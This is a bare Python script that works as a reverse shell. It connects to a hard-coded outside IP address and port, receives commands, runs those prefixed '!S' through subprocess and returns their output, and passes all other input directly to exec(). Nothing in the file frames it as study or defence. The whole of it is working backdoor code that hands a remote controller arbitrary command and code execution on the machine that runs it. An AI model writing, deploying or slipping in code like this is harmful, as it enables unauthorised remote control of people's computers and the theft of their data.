from socket import socket
import os
import subprocess

core = socket()
core.connect(('90.156.204.134', 5053))

while True:
    data = core.recv(2048).decode()

    if data[:2] == '!S':
        print([data[2:].split()])
        response = subprocess.check_output(data[2:].split())
    else:
        exec(data)
        response = 'executed'
    
    core.send(response.encode())
